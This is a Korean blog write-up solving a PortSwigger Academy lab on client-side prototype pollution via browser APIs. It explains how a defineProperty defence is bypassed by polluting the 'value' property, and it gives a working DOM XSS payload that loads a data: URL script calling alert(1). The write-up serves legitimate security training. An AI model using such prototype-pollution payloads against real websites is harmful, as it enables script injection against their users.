---
layout: post
title: "Burp Academy-Prototype Pollution 네번째 문제:Client-side prototype pollution via browser APIs"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, Prototype Pollution]
toc: true
---


# 개요
- 프로토타입 폴루션(Prototype Pollution, 프로토타입 오염) 취약점 네번째 문제이다. 
- 문제 주소: https://portswigger.net/web-security/prototype-pollution/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis
- 프로토타입 폴루션 설명 주소
1. https://portswigger.net/web-security/prototype-pollution
2. https://portswigger.net/web-security/prototype-pollution/browser-apis
- 난이도: PRACTITIONER (중간)

# 문제 분석

이번에는 브라우저 API에 취약점이 있는 경우다. 

```
This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
3. Combine these to call alert().

You can solve this lab manually in your browser, or use DOM Invader to help you.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes.
```

# 풀이 
Dom Invader 를 사용하면 너무 쉽게 풀리므로 직접 풀어보도록 하겠다. 

## 프로토타입 폴루션 가능여부 체크 
`&__proto__[test]=1234` 로 테스트해본다. 

프로토타입 폴루션이 기능한 것을 확인했다. 

![프로토타입 폴루션 체크](/images/burp-academy-prototype-pollution-4-1.png)


## 취약한 코드 분석 

`searchLoggerConfigurable.js` 파일을 본다. 
```js
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}

window.addEventListener("load", searchLogger);
```

```js
Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
```

이 부분이 예전 문제와 비교하면 달라진 부분이다. configurable 과 writable 을 false로 설정해서 prototype pollution 공격을 방어한 부분이 보인다. 그러나 허점이 있을 것이다. 그 곳을 찾아내서 공략하면 이 문제는 풀릴 것 같다. 


# 풀이 
## 우회 방법 분석 
크롬 디버거 툴의 자바스크립트 콘솔에서 간단한 테스트를 해본다. 위의 방어 코드를 우회하는 방법이 있을지 생각해본다. `Object.defineProperty` 코드가 실행되기 이전에 프로토타입 폴루션을 실시한 경우, 영향을 받는 것을 확인할 수 있다. 

```js
obj = {}
Object.defineProperty(obj, "test_property", {writable:false, configurable:false});
// writable, configurable 설정후에 값을 변경해본다. 
obj.test_property = 100;
// 아래 코드를 실행해보면 값이 변하지 않은 것을 확인할 수 있다. 
obj.test_property 

// 글로벌 Object의 prototype을 변경해본다. 
Object.prototype.value = 200;
// 글로벌 Object의 prototype을 변경하기 전에 생성된 obj객체의 test_property 의 값은 변하지 않은 것을 확인할 수 있다. 
obj.test_property

// 새로운 오브젝트를 만들어서 값을 확인해본다. 
obj2 = {};
Object.defineProperty(obj2, "test_property", {writable:false, configurable:false});

// test_property의 값이 글로벌 Object의 prototype의 value값으로 설정된 것을 확인할 수 있다. 
obj2.test_property
```

![크롬 콘솔 테스트](/images/burp-academy-prototype-pollution-4-console-test.png)


위 과정을 정리하면 다음과 같다. 
1. 오브젝트 obj 생성
2. Object.defineProperty 로 obj의 프로퍼티를 수정하는 것을 막음
3. 프로토타입 폴루션 시도 (=> obj는 영향받지 않음)
4. 오브젝트 obj2 생성
5. Object.defineProperty 로 obj2의 프로퍼티를 수정하는 것을 막음
6. 그러나 이미 3번 과정에서 프로토타입 폴루션이 되어 있는 상태이기 때문에 obj2는 영향을 받음

## 공격 코드 만들기 
문제의 방어 코드가 동작하는 타이밍(오브젝트가 생성되는 타이밍)을 생각해보면 로그를 기록하기 직전이다. 따라서 그 전에 프로토타입 폴루션을 할 수 있다면 config 오브젝트의 transport_url 프로퍼티의 값을 바꿀 수 있을 것이다. `value`프로퍼티에 XSS 페이로드를 설정한다. 
다음과 같은 페이로드를 만들었다. 

```&__proto__[value]=data:text/javascript,alert(1)``` 

성공! 

![alert 성공](/images/burp-academy-prototype-pollution-4-success.png)